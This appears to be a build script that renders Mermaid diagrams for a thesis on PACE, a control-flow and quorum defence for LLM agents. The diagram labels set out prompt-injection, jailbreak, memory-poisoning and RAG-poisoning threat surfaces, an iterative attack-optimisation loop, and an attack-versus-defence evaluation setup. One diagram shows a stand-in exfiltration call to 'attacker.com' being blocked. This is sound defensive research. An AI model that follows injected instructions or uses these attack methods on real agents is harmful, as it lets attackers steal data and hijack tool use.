#!/usr/bin/env bash
# Regenerate all 14 thesis diagram PNGs — no emoji, richer labels.
# Uses per-diagram heredocs to avoid bash single-quote escaping issues.

OUTDIR="Overleaf/Figures/png"
MMDC="mmdc"
SCALE=3
BG="white"
mkdir -p "$OUTDIR"

rend() {
  local name="$1" f="$2"
  printf "  rendering %-32s" "${name}..."
  $MMDC -i "$f" -o "$OUTDIR/${name}.png" -b "$BG" --scale "$SCALE" 2>/dev/null \
    && echo "OK" || { $MMDC -i "$f" -o "$OUTDIR/${name}.png" -b "$BG" --scale "$SCALE" 2>&1 | grep -i "error\|parse" | head -2; echo "FAIL"; }
}

T=$(mktemp -d)

# ── 1. agent_loop ─────────────────────────────────────────────────────────
cat > "$T/agent_loop.mmd" << 'EOF'
%%{init: {"theme": "neutral", "flowchart": {"curve": "basis", "padding": 20}}}%%
flowchart TD
    classDef main fill:#f0f4f8,stroke:#4a6fa5,stroke-width:2px,font-size:13px
    classDef hook fill:#ffffff,stroke:#4a6fa5,stroke-width:2px,font-size:11px
    classDef side fill:#f8f4f0,stroke:#9a7d5a,stroke-dasharray:5 3,font-size:12px
    classDef out  fill:#e8f4e8,stroke:#2d7a2d,stroke-width:2px,font-size:13px

    U["User Prompt\n(end-user or upstream caller)"]:::main
    H1(["H1"]):::hook
    L["LLM Policy V\n(victim language model)"]:::main
    H2(["H2"]):::hook
    T["Tool Executor\n(sandboxed side-effecting call)"]:::main
    H3(["H3"]):::hook
    H5(["H5"]):::hook
    R["Response to User\n(final generation)"]:::out
    M[("Memory Store\n(persistent key-value state)")]:::side
    RC[("Retrieval Corpus\n(vector index / RAG store)")]:::side
    H4(["H4"]):::hook

    U -->|"query text"| H1 --> L
    L -->|"structured tool call"| H2 --> T
    T -->|"tool result / observation"| H3 --> L
    L -->|"final natural-language answer"| H5 --> R
    M -.->|"retrieved context H4"| H4 -.-> L
    L -.->|"write to memory H5"| M
    RC -.->|"retrieved documents"| T
EOF
rend "agent_loop" "$T/agent_loop.mmd"

# ── 2. threat_model ───────────────────────────────────────────────────────
cat > "$T/threat_model.mmd" << 'EOF'
%%{init: {"theme": "neutral"}}%%
flowchart TD
    classDef channel fill:#fff3cd,stroke:#c8960c,stroke-width:2px,font-size:12px
    classDef spqhook  fill:#d1e7ff,stroke:#0d6efd,stroke-width:2px,font-size:11px
    classDef agent    fill:#d4edda,stroke:#28a745,stroke-width:2.5px,font-size:13px,font-weight:bold
    classDef adv      fill:#f8d7da,stroke:#dc3545,stroke-width:2px,font-size:12px

    ADV["Adversary\ngrey-box: knows hook logic\nand PACE hyperparameters"]:::adv

    subgraph CHANNELS["Untrusted input channels intercepted by PACE"]
        UI["User Input\ndirect prompt, jailbreak string"]:::channel
        TR["Tool Returns\nweb snippets, API responses"]:::channel
        MEM["Memory Store\npoisoned long-term state"]:::channel
        RAG["Retrieval Corpus\nPoisonedRAG, supply-chain docs"]:::channel

        S1["PACE Hook H1 / L1\nchannel separator"]:::spqhook
        S2["PACE Hook H3 / L2\ntool output probe"]:::spqhook
        S3["PACE Hook H5 / L5\nmemory write guard"]:::spqhook
        S4["PACE Hook H4 / L6\nretrieval integrity guard"]:::spqhook

        AG["Agent V + PACE Control Plane\nCFI gate + quorum gate"]:::agent
    end

    ADV -.->|"prompt injection"| UI
    ADV -.->|"indirect injection via tool response"| TR
    ADV -.->|"persistence attack via memory"| MEM
    ADV -.->|"corpus poisoning"| RAG

    UI  --> S1 --> AG
    TR  --> S2 --> AG
    MEM --> S3 --> AG
    RAG --> S4 --> AG
EOF
rend "threat_model" "$T/threat_model.mmd"

# ── 3. pssu_loop ──────────────────────────────────────────────────────────
cat > "$T/pssu_loop.mmd" << 'EOF'
%%{init: {"theme": "neutral"}}%%
flowchart LR
    classDef step  fill:#dbeafe,stroke:#3b82f6,stroke-width:2px,font-size:12px
    classDef state fill:#fef3c7,stroke:#d97706,stroke-width:2px,font-size:12px
    classDef ctrl  fill:#d1fae5,stroke:#059669,stroke-width:2px,font-size:12px

    ST(["Attack State A_t\npolicy weights / prompt archive"]):::state

    P["Propose\nGenerate batch of candidate triggers\nor attack policies for goal g"]:::step
    SC["Score\nAssign scalar S(u,g) to each candidate\nvia internal rule or LLM-as-judge"]:::step
    SE["Select\nRetain top-k candidates\nfrom scored batch"]:::step
    UP["Update\nMutate internal attack state:\npolicy weights, archive,\nmutation operators"]:::step

    ES["Early Stop\nBest score >= threshold tau\nAttempt succeeded"]:::ctrl
    BG["Budget Exhausted\nt > B iterations\nLog result and abort"]:::ctrl

    ST -->|"read A_t"| P
    P  -->|"candidate triggers"| SC
    SC -->|"scored batch"| SE
    SE -->|"top-k survivors"| UP
    UP -->|"new state A_(t+1)"| ST

    SC -.->|"threshold crossed"| ES
    SE -.->|"t > B"| BG
EOF
rend "pssu_loop" "$T/pssu_loop.mmd"

# ── 4. spq_overview ───────────────────────────────────────────────────────
cat > "$T/spq_overview.mmd" << 'EOF'
%%{init: {"theme": "neutral"}}%%
flowchart TD
    classDef main  fill:#f0f4f8,stroke:#4a6fa5,stroke-width:2px,font-size:12px
    classDef llm   fill:#dbeafe,stroke:#3b82f6,stroke-width:2px,font-size:12px
    classDef plan  fill:#e0e7ff,stroke:#4338ca,stroke-width:2px,font-size:12px
    classDef gate  fill:#fef3c7,stroke:#d97706,stroke-width:2.5px,font-size:12px
    classDef exec  fill:#d1fae5,stroke:#059669,stroke-width:1.5px,font-size:12px
    classDef block fill:#fee2e2,stroke:#dc2626,stroke-width:2px,font-size:12px
    classDef good  fill:#d1fae5,stroke:#059669,stroke-width:2px,font-size:12px

    Q["User Query\nend-user intent"]:::main
    PL["Planner LLM\nRuns before any untrusted data.\nInput: user request, tool schemata, system prompt.\nOutput: typed PACE plan graph."]:::llm
    SP["PACE Plan pi-hat\nFinite typed graph of allowed tool calls.\nEach node binds tool name to arg schema."]:::plan
    AG["Agent Executor\nRuns tool-using loop.\nAccumulates evidence pool from all\ntool returns, memory, retrieval."]:::main
    TC["Proposed Tool Call R\ntool name plus structured arguments"]:::main

    CFI{"CFI Gate\nC(R, pi-hat) = 1\niff R matches a node in pi-hat"}:::gate
    QV{"Quorum Gate\nQ(R) = 1\niff n_agree(R) >= q\nacross K clusters"}:::gate

    BLK["Block / Replan\nCFI violation logged.\nHard reject, no side effect."]:::block
    DIS["Dissent Logged\nMinority cluster noted.\nPlanner abstains or replans."]:::block
    RES["Verified Tool Execution\nBoth invariants satisfied:\nC = 1 and Q = 1"]:::good

    subgraph EXECPOOL["K Independent Executor Instances (one per evidence cluster)"]
        E1["Executor E_1\nCluster-1 evidence only\nTemperature T = 0.7"]:::exec
        EK["Executor E_2 ... E_K\nDisjoint evidence clusters\nTemperature T = 0.7"]:::exec
    end

    Q --> PL --> SP --> AG --> TC --> CFI
    SP -.->|"call whitelist"| CFI
    CFI -->|"C = 0, violation"| BLK
    CFI -->|"C = 1, pass"| QV

    E1 -->|"proposed call"| QV
    EK -->|"proposed call"| QV

    QV -->|"agree >= q"| RES
    QV -->|"agree < q"| DIS
EOF
rend "spq_overview" "$T/spq_overview.mmd"

# ── 5. feature_extractors ─────────────────────────────────────────────────
cat > "$T/feature_extractors.mmd" << 'EOF'
%%{init: {"theme": "neutral"}}%%
flowchart TD
    classDef lbl  fill:#f0f4f8,stroke:#4a6fa5,stroke-width:2px,font-size:12px
    classDef gate fill:#fef3c7,stroke:#d97706,stroke-width:2.5px,font-size:12px
    classDef note fill:#f8f8f8,stroke:#aaa,stroke-dasharray:4 2,font-size:11px

    IN["Evidence Span — input unit\ntext + provenance + metadata"]:::lbl

    L1["L1 — Channel Separator\nNonce-anchored delimiters on untrusted fields.\nDelimiter-escape detection.\nBased on StruQ and Spotlight techniques.\nOutput: trust_label in {trusted, untrusted, mixed}"]:::lbl
    L2["L2 — Tool Output Probe\nKnown-answer canary probe on tool returns.\nRegex-based adversarial signature scan.\nDataSentinel-style design.\nOutput: probe_score in [0.0, 1.0]"]:::lbl
    L3["L3 — Action Consistency\nCross-check proposed tool calls vs PACE plan.\nFlags tools not present in pi-hat.\nMELON-inspired re-execution idea.\nOutput: consistency flag (advisory only)"]:::lbl
    L4["L4 — Output Consistency\nCircuit-style refusal-tendency signal on final text.\nChecks free-text output for adversarial indicators.\nOutput: consistency score (advisory only)"]:::lbl
    L5["L5 — Memory Write Guard\nWeighted-feature persistence risk scorer.\nBlocks high-risk writes to long-term memory.\nA-MemGuard style design.\nOutput: block or allow memory write"]:::lbl
    L6["L6 — Retrieval Integrity Guard\nCluster and self-consistency screening.\nApplied at retrieval hook H4.\nTrustRAG-style two-stage check.\nOutput: filtered retrieval context"]:::lbl

    CFI{"CFI Gate\nC(R, pi-hat)"}:::gate
    QV{"Quorum Gate\nQ(R)"}:::gate

    NB["All L1-L6 are NON-BLOCKING probes.\nThey attach advisory signals to evidence spans.\nOnly the CFI and Quorum gates issue hard decisions."]:::note

    IN --> L1 --> L2 --> L3 --> L4 --> L5 --> L6
    L6 -->|"trust_label, probe_score,\nconsistency signals"| CFI
    L6 -->|"signals to clustering and voting"| QV
    NB -.- L3
EOF
rend "feature_extractors" "$T/feature_extractors.mmd"

# ── 6. threat_model_detailed ──────────────────────────────────────────────
cat > "$T/threat_model_detailed.mmd" << 'EOF'
%%{init: {"theme": "neutral"}}%%
flowchart TD
    classDef surface fill:#fff3cd,stroke:#c8960c,stroke-width:2px,font-size:12px
    classDef example fill:#f8f4f0,stroke:#9a7d5a,stroke-dasharray:4 2,font-size:11px
    classDef hook    fill:#d1e7ff,stroke:#0d6efd,stroke-width:2px,font-size:12px
    classDef agent   fill:#d4edda,stroke:#28a745,stroke-width:2.5px,font-size:13px
    classDef oos     fill:#f8f8f8,stroke:#ccc,stroke-dasharray:5 3,font-size:11px

    subgraph S1["Surface 1 — User Input: direct and role-play attacks"]
        UI["User Input Channel\nText provided by end-user or caller"]:::surface
        E1A["Direct prompt injection,\nrole-play jailbreak,\ngoal-hijack string"]:::example
        H1["Hook H1 / L1 — Channel Separator"]:::hook
    end

    subgraph S2["Surface 2 — Tool Returns: IPI via observations"]
        TR["Tool Return Channel\nWeb fetch, API response, plugin output"]:::surface
        E2A["Indirect injection in web snippet,\nmalicious API JSON field,\nMCP tool descriptor abuse"]:::example
        H3["Hook H3 / L2 — Tool Output Probe"]:::hook
    end

    subgraph S3["Surface 3 — Memory: persistence attacks"]
        MEM["Memory Channel\nLong-term key-value store"]:::surface
        E3A["Poisoned long-term memory entry,\ncross-session policy persistence,\nagent-to-agent relay attack"]:::example
        H5["Hook H5 / L5 — Memory Write Guard"]:::hook
    end

    subgraph S4["Surface 4 — Retrieval Corpus: data-plane attacks"]
        RAG["Retrieval / RAG Channel\nVector index, knowledge base"]:::surface
        E4A["PoisonedRAG document injection,\nsupply-chain tool descriptor,\nembedding-space collision"]:::example
        H4["Hook H4 / L6 — Retrieval Integrity Guard"]:::hook
    end

    AG["Agent V + PACE Control Plane\nAll hook intercepts funnel here."]:::agent
    OOS["Out of scope:\nweight poisoning, container escape,\nside-channel attacks,\noperator social engineering"]:::oos

    E1A -.->|"injection path"| H1 --> AG
    E2A -.->|"injection path"| H3 --> AG
    E3A -.->|"injection path"| H5 --> AG
    E4A -.->|"injection path"| H4 --> AG
EOF
rend "threat_model_detailed" "$T/threat_model_detailed.mmd"

# ── 7. spq_dataflow ───────────────────────────────────────────────────────
cat > "$T/spq_dataflow.mmd" << 'EOF'
%%{init: {"theme": "neutral"}}%%
flowchart LR
    classDef main  fill:#f0f4f8,stroke:#4a6fa5,stroke-width:2px,font-size:12px
    classDef llm   fill:#dbeafe,stroke:#3b82f6,stroke-width:2px,font-size:12px
    classDef probe fill:#fef9c3,stroke:#ca8a04,stroke-dasharray:4 2,font-size:11px
    classDef gate  fill:#fef3c7,stroke:#d97706,stroke-width:2.5px,font-size:12px
    classDef good  fill:#d1fae5,stroke:#059669,stroke-width:2px,font-size:12px
    classDef bad   fill:#fee2e2,stroke:#dc2626,font-size:11px

    REQ["Input Request\nuser query text"]:::main
    L1["L1\nChannel\nSeparator"]:::probe
    PL["Planner LLM\ntrusted context only"]:::llm
    SP["PACE Plan\npi-hat\ntyped call graph"]:::main
    EX["Agent Executor\nevidence pool\naccumulation"]:::main

    L2["L2 Tool Output Probe\nprobe_score in [0,1]"]:::probe
    L3["L3 Action Consistency\nconsistency flag"]:::probe
    L4["L4 Output Consistency\nconsistency score"]:::probe
    L5["L5 Memory Write Guard\npersistence risk score"]:::probe
    L6["L6 Retrieval Integrity\nfilterd retrieval context"]:::probe

    CFI{"CFI Gate\nC(R, pi-hat)"}:::gate
    QV{"Quorum Gate\nQ(R)"}:::gate

    OUT["Verified Output\ntool fired, trace flushed"]:::good
    BLK["Block / Replan\nCFI violation"]:::bad
    DIS["Dissent Log\nquorum not met"]:::bad

    REQ --> L1 --> PL --> SP --> EX
    EX -->|"tool call boundary"| L2 --> L3 --> L4 --> L5
    EX -.->|"retrieval hook"| L6
    L5 --> CFI
    L6 -.->|"integrity signal"| QV
    SP -.->|"call whitelist"| CFI
    CFI -->|"pass C=1"| QV
    CFI -->|"fail C=0"| BLK
    QV  -->|"agree >= q"| OUT
    QV  -->|"dissent"| DIS
EOF
rend "spq_dataflow" "$T/spq_dataflow.mmd"

# ── 8. cfi_invariant ──────────────────────────────────────────────────────
cat > "$T/cfi_invariant.mmd" << 'EOF'
%%{init: {"theme": "neutral"}}%%
flowchart TD
    classDef plan  fill:#dbeafe,stroke:#3b82f6,stroke-width:2px,font-size:12px
    classDef req   fill:#f0f4f8,stroke:#4a6fa5,stroke-width:2px,font-size:13px
    classDef pass  fill:#d1fae5,stroke:#059669,stroke-width:2.5px,font-size:13px
    classDef fail  fill:#fee2e2,stroke:#dc2626,stroke-width:2.5px,font-size:13px
    classDef note  fill:#f8f8f8,stroke:#ccc,font-size:11px

    subgraph PASSCASE["PASS case — C(R, pi-hat) = 1"]
        SP1["PACE Plan pi-hat\n- search(query: string)\n- send_email(to: str, body: str)\n- read_file(path: str)"]:::plan
        RC1["Proposed call R:\nsearch(query = 'user request')"]:::req
        OK["PASS — node match found\nC = 1, execution permitted.\nCall proceeds to quorum gate."]:::pass
    end

    subgraph FAILCASE["FAIL case — C(R, pi-hat) = 0"]
        SP2["PACE Plan pi-hat\n- search(query: string)\n- send_email(to: str, body: str)\n- read_file(path: str)"]:::plan
        RC2["Proposed call R:\nexfil_data(url = attacker.com)"]:::req
        NO["BLOCK — no node match\nC = 0, control-flow violation.\nTool name absent from pi-hat."]:::fail
        VIO["Violation logged with full trace.\nPlanner routes to abstain or replan.\nNo side effect occurs."]:::note
    end

    SP1 --> RC1 --> OK
    SP2 --> RC2 --> NO --> VIO
EOF
rend "cfi_invariant" "$T/cfi_invariant.mmd"

# ── 9. quorum_invariant ───────────────────────────────────────────────────
cat > "$T/quorum_invariant.mmd" << 'EOF'
%%{init: {"theme": "neutral"}}%%
flowchart LR
    classDef input fill:#f0f4f8,stroke:#4a6fa5,stroke-width:2px,font-size:12px
    classDef exec  fill:#dbeafe,stroke:#3b82f6,stroke-width:2px,font-size:12px
    classDef vote  fill:#fef3c7,stroke:#d97706,stroke-width:2.5px,font-size:12px
    classDef agree fill:#d1fae5,stroke:#059669,stroke-width:2.5px,font-size:12px
    classDef diss  fill:#fee2e2,stroke:#dc2626,stroke-width:2px,font-size:12px
    classDef note  fill:#f8f8f8,stroke:#ccc,font-size:11px

    TC["Proposed Tool Call R\nK = 3 independent executors\nquorum threshold q = ceil(K/2) = 2"]:::input

    E1["Executor E_1\nCluster-1 evidence only\nTemperature T = 0.7\nProposes: same call R"]:::exec
    E2["Executor E_2\nCluster-2 evidence only\nTemperature T = 0.7\nProposes: same call R"]:::exec
    E3["Executor E_3\nCluster-3 — adversarial evidence\nTemperature T = 0.7\nProposes: adversarial variant R_star"]:::exec

    VT["Quorum Voter\nCount structurally equivalent\nproposals across clusters.\nn_agree(R) = ?"]:::vote

    AG["AGREE — Q(R) = 1\nn_agree = 2 >= q = 2\nQuorum satisfied.\nCall proceeds, still requires C = 1."]:::agree
    DIS["DISSENT — Q(R) = 0\nn_agree < q\nQuorum not met.\nTool call suppressed."]:::diss
    NOTE["Planner receives dissent report.\nAbstains or replans with reduced scope.\nDissent margin recorded in trace."]:::note

    TC --> E1 --> VT
    TC --> E2 --> VT
    TC --> E3 -->|"minority vote"| VT
    VT -->|"Q = 1"| AG
    VT -->|"Q = 0"| DIS --> NOTE
EOF
rend "quorum_invariant" "$T/quorum_invariant.mmd"

# ── 10. eval_pipeline ─────────────────────────────────────────────────────
cat > "$T/eval_pipeline.mmd" << 'EOF'
%%{init: {"theme": "neutral"}}%%
flowchart LR
    classDef box   fill:#f0f4f8,stroke:#4a6fa5,stroke-width:2px,font-size:12px
    classDef llm   fill:#dbeafe,stroke:#3b82f6,stroke-width:2px,font-size:12px
    classDef score fill:#d1fae5,stroke:#059669,stroke-width:2px,font-size:12px
    classDef note  fill:#f8f8f8,stroke:#ccc,stroke-dasharray:4 2,font-size:11px

    GB["Goal Bank {g_i}\nHarmful or policy-violating objectives\ndrawn from benchmark suite"]:::box
    ATK["Attack Module A\nPSSU driver: iterates\nPropose-Score-Select-Update\nwith fixed budget B"]:::box
    VD["Victim V + Defence D\nTool-using agent process.\nPACE or baseline defence\nwired at five hook events."]:::llm
    JD["Judge LLM J\nJ != V, distinct endpoint.\nScores response Y against\ngoal g on frozen rubric."]:::llm
    ASR["Judged ASR alpha\nPer (attack, defence) cell\naveraged over seeds"]:::score
    AGG["Aggregate and Bootstrap\nalpha-hat = mean of alpha_s values\nPercentile 95% CI over seed axis"]:::score

    SEED["Each seed s is an independent\nfull replica of the scenario harness.\nNot a re-label of one run."]:::note

    GB  -->|"goal g"| ATK
    ATK -->|"adversarial trigger"| VD
    VD  -->|"agent response Y"| JD
    JD  -->|"rubric score"| ASR
    ASR -->|"per-cell alpha"| AGG
    VD  -.->|"PSSU feedback\ndefended output"| ATK
    SEED -.- VD
EOF
rend "eval_pipeline" "$T/eval_pipeline.mmd"

# ── 11. matrix_protocol ───────────────────────────────────────────────────
cat > "$T/matrix_protocol.mmd" << 'EOF'
%%{init: {"theme": "neutral"}}%%
flowchart TD
    classDef hdr  fill:#dbeafe,stroke:#3b82f6,stroke-width:2px,font-size:12px,font-weight:bold
    classDef cell fill:#f0f4f8,stroke:#4a6fa5,stroke-width:1px,font-size:11px
    classDef boot fill:#d1fae5,stroke:#059669,stroke-width:2px,font-size:12px
    classDef note fill:#f8f8f8,stroke:#ccc,stroke-dasharray:4 2,font-size:11px

    subgraph MATRIX["Evaluation matrix: attack families x defence configurations x seeds"]
        D0["no_defence\nbaseline"]:::hdr
        D1["PACE\nfull configuration"]:::hdr
        D2["struq\nreproduced"]:::hdr
        D3["13 further\nreproduced baselines"]:::hdr

        RL["RL (defence-aware policy)\nalpha_s = judged ASR for seed s"]:::cell
        PAIR["PAIR (iterative black-box)\nalpha_s = judged ASR for seed s"]:::cell
        PR["PoisonedRAG (corpus attack)\nalpha_s = judged ASR for seed s"]:::cell
        HRT["HumanRT (red-team schedule)\nalpha_s = judged ASR for seed s"]:::cell
        SC["SupplyChain (descriptor abuse)\nalpha_s = judged ASR for seed s"]:::cell
    end

    BOOT["Bootstrap Aggregation Layer\nalpha-hat = mean of alpha_s over seeds\n95% percentile CI via resampling\nacross seed axis"]:::boot
    NOTE["Within-run CI (single fixed seed)\nis NOT equivalent to\nacross-seed CI (multiple seeds).\nBoth are reported separately."]:::note

    RL   --> BOOT
    PAIR --> BOOT
    PR   --> BOOT
    HRT  --> BOOT
    SC   --> BOOT
    NOTE -.- BOOT
EOF
rend "matrix_protocol" "$T/matrix_protocol.mmd"

# ── 12. judge_pipeline ────────────────────────────────────────────────────
cat > "$T/judge_pipeline.mmd" << 'EOF'
%%{init: {"theme": "neutral"}}%%
flowchart LR
    classDef inp   fill:#f0f4f8,stroke:#4a6fa5,stroke-width:2px,font-size:12px
    classDef jdg   fill:#dbeafe,stroke:#3b82f6,stroke-width:2px,font-size:12px
    classDef r10   fill:#fee2e2,stroke:#dc2626,font-size:12px
    classDef r07   fill:#fff3cd,stroke:#ca8a04,font-size:12px
    classDef r03   fill:#fef9c3,stroke:#d97706,font-size:12px
    classDef r00   fill:#d1fae5,stroke:#059669,font-size:12px
    classDef thr   fill:#f3e8ff,stroke:#7c3aed,stroke-width:2px,font-size:12px
    classDef bias  fill:#f8f8f8,stroke:#ccc,stroke-dasharray:4 2,font-size:11px

    G["Goal g\nHarmful or policy-violating\ntarget objective"]:::inp
    Y["Agent Response Y\nFull generation output\nincluding any tool calls"]:::inp
    J["Judge LLM J\nDistinct from victim V.\nFrozen system prompt and rubric.\nScores pair (g, Y)."]:::jdg

    R10["Score 1.0\nFull policy-violating success:\nobjective fully achieved by agent"]:::r10
    R07["Score 0.7\nPartial or minor success:\nobjective partially achieved"]:::r07
    R03["Score 0.3\nBlocked or largely failed:\nattempt evident, effect minimal"]:::r03
    R00["Score 0.0\nClear failure or safe response:\nno harmful effect produced"]:::r00

    THR["Decision threshold tau\nscore >= tau => judged success\nbinary indicator for ASR computation"]:::thr
    BIAS["Rubric is frozen per experiment.\nResults reproducible under fixed J.\nNot an oracle substitute for human review.\nJudge bias documented and acknowledged."]:::bias

    G --> J
    Y --> J
    J --> R10
    J --> R07
    J --> R03
    J --> R00
    R07 -.->|"threshold boundary"| THR
    BIAS -.- J
EOF
rend "judge_pipeline" "$T/judge_pipeline.mmd"

# ── 13. adaptive_budget ───────────────────────────────────────────────────
cat > "$T/adaptive_budget.mmd" << 'EOF'
%%{init: {"theme": "neutral"}}%%
flowchart TD
    classDef bgt  fill:#dbeafe,stroke:#3b82f6,stroke-width:2px,font-size:12px
    classDef step fill:#f0f4f8,stroke:#4a6fa5,stroke-width:2px,font-size:12px
    classDef ctrl fill:#d1fae5,stroke:#059669,stroke-width:2px,font-size:12px
    classDef stop fill:#fef3c7,stroke:#d97706,stroke-width:2px,font-size:12px
    classDef done fill:#fee2e2,stroke:#dc2626,stroke-width:2px,font-size:12px

    B["Budget B (PSSU iteration count)\nB = p + s + coordination overhead.\nFixed per attack family and experiment cell.\nAttack success is monotone in B."]:::bgt

    P["Propose\nGenerate p candidate triggers\nor adversarial policy actions\nfor current attack goal g"]:::step
    SC["Score\nEvaluate s candidates via\ninternal rule or judge LLM J.\nAssign scalar S(u,g) in [0,1]."]:::step
    SE["Select\nRetain top-k candidates by score.\nDiscard remainder.\nFeed survivors to Update."]:::step
    UP["Update\nMutate attack state A_(t+1):\nUpdate policy weights.\nRefill prompt archive.\nRefresh mutation operators."]:::step

    ES["Early Stop\nBest score >= threshold tau.\nCurrent attempt succeeded.\nLog success and terminate."]:::stop
    AB["Budget Abort\nt > B, iterations exhausted.\nLog failure, record best score."]:::done
    RT["Retry with New Seed\nIf n_success = 0 after abort,\nrestart with different random seed."]:::ctrl

    B --> P --> SC --> SE --> UP
    UP -->|"t += 1, next iteration"| P
    SC -.->|"threshold crossed"| ES
    SE -.->|"t > B"| AB
    AB -.->|"seed exhausted"| RT
EOF
rend "adaptive_budget" "$T/adaptive_budget.mmd"

# ── 14. lowlevel_pipeline ─────────────────────────────────────────────────
cat > "$T/lowlevel_pipeline.mmd" << 'EOF'
%%{init: {"theme": "neutral"}}%%
flowchart TD
    classDef main  fill:#f0f4f8,stroke:#4a6fa5,stroke-width:2px,font-size:12px
    classDef llm   fill:#dbeafe,stroke:#3b82f6,stroke-width:2.5px,font-size:12px
    classDef spq   fill:#fef9c3,stroke:#ca8a04,stroke-width:2px,font-size:11px
    classDef gate  fill:#fef3c7,stroke:#d97706,stroke-width:2.5px,font-size:12px
    classDef good  fill:#d1fae5,stroke:#059669,stroke-width:2px,font-size:12px
    classDef bad   fill:#fee2e2,stroke:#dc2626,stroke-width:2px,font-size:12px
    classDef dec   fill:#ffffff,stroke:#4a6fa5,stroke-width:2px,font-size:12px

    UQ["User Query\nprocess_query() entry point in LocalAgent"]:::main

    subgraph CINPUT["check_input() — Hook H1: Planner Phase (trusted path only)"]
        PL["Planner LLM\nInput: system_prompt + tool_schemas + user_query.\nNo untrusted data reaches this call.\nOutput: structured PACE plan."]:::llm
        SP["PACE Plan pi-hat\nTyped graph: tool_name mapped to arg_schema\nand post-condition. Fixed for session duration."]:::main
    end

    subgraph MEMRET["Memory Retrieval — Hook H4"]
        MR["Keyword Overlap Scorer\nScores memory entries against query.\nReturns top-5 by overlap score."]:::main
        CR["check_retrieval() / L6 Guard\nRetrieval Integrity Guard screens\nentries before injection into context."]:::spq
    end

    BUILD["Message Assembly\nsystem_prompt + history last 4 turns\n+ memory_context + user_query"]:::main

    VLM["Victim LLM\nPOST /api/chat to Ollama endpoint.\nIncludes tools array if native_tools=True.\nFallback: heuristic regex tool detection."]:::llm

    DET{"Tool call\ndetected in\nresponse?"}:::dec
    PLAIN["Plain Text Path\nNo tool call in response.\nProceeds to check_output()."]:::main

    subgraph CTOOLCALL["check_tool_call() — Hook H2: PACE Internal Processing"]
        direction TB
        MKSPAN["_make_span() per evidence byte\nWraps each evidence unit as EvidenceSpan:\n(text, provenance, trust_label, probe_score, metadata)"]:::spq
        L1L5["L1 + L5: label_trust()\nL1 ChannelSeparation: nonce delimiters, delimiter-escape detection.\nL5 MemoryWriteGuard: persistence risk scoring.\nOutput: trust_label = trusted / untrusted / mixed"]:::spq
        L2["L2: probe_evidence()\nRegex-based adversarial signature scan.\nKnown-answer canary probe on tool returns.\nOutput: probe_score in [0.0, 1.0]"]:::spq
        NLI["NLI Independence Filter\nModel: cross-encoder/nli-deberta-v3-small\nFor each candidate span:\nif P(entailment | kept_span, candidate) >= 0.70\nthen drop candidate as redundant.\nFallback: cosine similarity >= 0.92\nusing all-MiniLM-L6-v2 embeddings.\nuser_input spans are anchors and never filtered."]:::spq
        EMB["Embedding: _embed()\nModel: all-MiniLM-L6-v2 (sentence-transformers)\nDimension: 384 with normalize_embeddings=True.\nFallback: deterministic hash embedding in CI mode."]:::spq
        KM["Clustering: _kmeans(K, seed)\nPure-Python Euclidean k-means, 50 max iterations.\nInput: 384-dim normalised span vectors.\nOutput: K disjoint cluster lists."]:::spq
        EXPOOL["K x Executor.fill(plan, cluster_id, evidence)\nEach executor sees only its own cluster evidence.\nLLM temperature T = 0.7 for stochastic diversity.\nOutput: JSON with calls list of tool and args pairs."]:::llm
        QV["AgreementVoter.vote(per_cluster_calls)\nCapability shim: high-privilege tools\nrequire required_source = user_input.\nCounts n_agree(R): structurally equivalent\nproposals across clusters.\nDecision: n_agree(R) >= q ?"]:::gate
        CFI["CFI Gate: C(R, pi-hat)\nplan.find_node(tool_name, tool_args).\nChecks: tool name in pi-hat AND\narguments satisfy node schema.\nNot found => hard_block, log violation."]:::gate
        MKSPAN --> L1L5 --> L2 --> NLI --> EMB --> KM --> EXPOOL --> QV --> CFI
    end

    CO["check_output()\nFlush defence trace to timestamped log.\nAll hook events recorded with\nspan IDs and timestamps."]:::main
    CMW["check_memory_write()\nHook H5 / L5 Memory Write Guard.\nScores write request for persistence risk.\nBlocks untrusted high-risk writes."]:::main
    RES["Return Result\nanswer + tool_calls\n+ defense_trace + spq_planner telemetry"]:::good
    BLK["Block / Replan\nCFI hard block.\nViolation logged with trace."]:::bad
    DIS["Dissent Logged\nQuorum not met, n_agree < q.\nPlanner abstains or replans."]:::bad

    UQ --> PL --> SP
    UQ --> MR --> CR
    SP --> BUILD
    CR --> BUILD
    BUILD --> VLM --> DET
    DET -->|"no"| PLAIN
    DET -->|"yes"| CTOOLCALL
    SP -.->|"call whitelist for CFI"| CFI
    CFI -->|"C = 0, violation"| BLK
    QV  -->|"n_agree < q"| DIS
    CFI -->|"C = 1 and Q = 1"| CO
    PLAIN --> CO --> CMW --> RES
EOF
rend "lowlevel_pipeline" "$T/lowlevel_pipeline.mmd"

echo ""
echo "Results:"
ls -lh "$OUTDIR/"*.png 2>/dev/null | awk '{print $5"\t"$9}'
rm -rf "$T"
